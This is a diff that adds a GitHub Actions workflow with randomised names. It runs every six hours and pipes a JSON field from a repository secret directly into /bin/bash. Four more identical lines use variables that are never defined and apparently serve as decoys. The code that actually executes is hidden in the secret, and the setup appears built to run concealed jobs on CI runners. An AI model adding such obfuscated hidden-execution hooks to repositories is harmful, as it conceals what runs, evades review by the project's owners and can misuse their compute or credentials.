@@ -1,0 +1,22 @@
+name: naizida4561
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '27 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: naizida4561
+        env:
+          pslgy84086: ${{ secrets.pslgy84086 }}
+        run: |
+          echo $pslgy84086 | jq -r .wwidb92434 | /bin/bash
+          echo $do0799 | jq -r .djzg75201 | /bin/bash
+          echo $aw88 | jq -r .z0 | /bin/bash
+          echo $iyuyw47 | jq -r .b000 | /bin/bash
+          echo $nzl231 | jq -r .aqd07957 | /bin/bash
+
